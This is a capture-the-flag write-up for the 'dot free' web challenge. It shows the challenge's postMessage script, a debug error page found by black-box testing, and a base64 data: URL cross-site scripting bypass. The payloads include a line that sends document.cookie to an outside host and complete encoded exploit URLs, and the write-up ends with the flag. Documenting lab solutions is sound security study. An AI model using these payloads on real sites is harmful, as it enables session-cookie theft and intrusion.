# dot free (web, 48 solved, 105 points)

```All the IP addresses and domain names have dots, but can you hack without dot?```

![](pic1.png)

Firstly we check the source code of this site and found some javascript code.
But we didn't take a closer look into that script.


```javascript
<script>
    function lls(src) {
        var el = document.createElement('script');
        if (el) {
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        }
    };

    function lce(doc, def, parent) {
        var el = null;
        if (typeof doc.createElementNS != "undefined") el = doc.createElementNS("http://www.w3.org/1999/xhtml", def[0]);
        else if (typeof doc.createElement != "undefined") el = doc.createElement(def[0]);

        if (!el) return false;

        for (var i = 1; i
        < def.length; i++) el.setAttribute(def[i++], def[i]);
        if (parent) parent.appendChild(el);
        return el;
    };
    window.addEventListener('message', function (e) {
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                if (e.data.iframe.type == "iframe") {
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                } else {
                    lls(e.data.iframe.value)
                }
            }
        }
    }, false);
    window.onload = function (ev) {
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
    }
</script>
```

And so we take a deeper look into the website, with black box testing, and found an error page, which present us a lot of information.
The error page occurs, when we do a POST request with an empty body.
we can take from this some information, like which backend are running and which functions are called.

![](pic2.png) 


From now we know that the backend are written in python and the input are validated with a regular expression. 
We take a deeper look into the error page and we get some more information.
* The *dot free* website give us a result as a JSON object. (What we knew already, because of the black box testing)
* validURL checks our url with the regex
* we guess that RunWebDriver will parse our input

We thought that the data object could may interesting.
Or moreover it could be the solution to change data in data object.
But how?

Now we remember the javascript of the beginning and take a deeper look into it. 
And we found out that we can give the site a JSON object (https://www.w3schools.com/js/js_json_objects.asp) 
over GET (HTTP METHOD), which have to be a iframe.
Our question was, "is it possible to change the data object with the JSON object from the GET request"?
From this point we try something out and found that we can set something into the JSON result (data object) of the website.

Our first try is to set an alert(1) into the data part of the JSON object.
We encode *alert(1)* with base64 and do a GET REQUEST. 

```http://13.57.104.34/?{%22iframe%22:{%22value%22:%22data:text/javascript;base64,YWxlcnQoMSk=%22}}```

And our try succeeded!

From now we try to set something into the data object, which can leak some information, like a image.
And try to set it directly into the data object.

```javascript
(new Image()).src='http://lev9l.ddns.net'
```

We have to encode this with base64.

```
http://13.57.104.34/?{%22iframe%22:{%22value%22:%22data:text/javascript;base64,KG5ldyBJbWFnZSgpKS5zcmM9J2h0dHA6Ly9sZXY5bC5kZG5zLm5ldCc=%22}}
```

And it works. now it is clear!
We guessing that the flag could be the cookie of the WebDriver, which emulates a browser.
And yes it was there!

To get the cookie out of the server we use the image as a GET request, to send us the cookie:

```javascript
(new Image()).src='http://lev9l.ddns.net/?c='+document.cookie
```

And we encode that with base64:

```
http://13.57.104.34/?{%22iframe%22:{%22value%22:%22data:text/javascript;base64,KG5ldyBJbWFnZSgpKS5zcmM9J2h0dHA6Ly9sZXY5bC5kZG5zLm5ldC8/Yz0nK2RvY3VtZW50LmNvb2tpZQ==%22}}
```

Finally we get the flag to our server over the GET request.

Flag: rwctf{L00kI5TheFlo9} 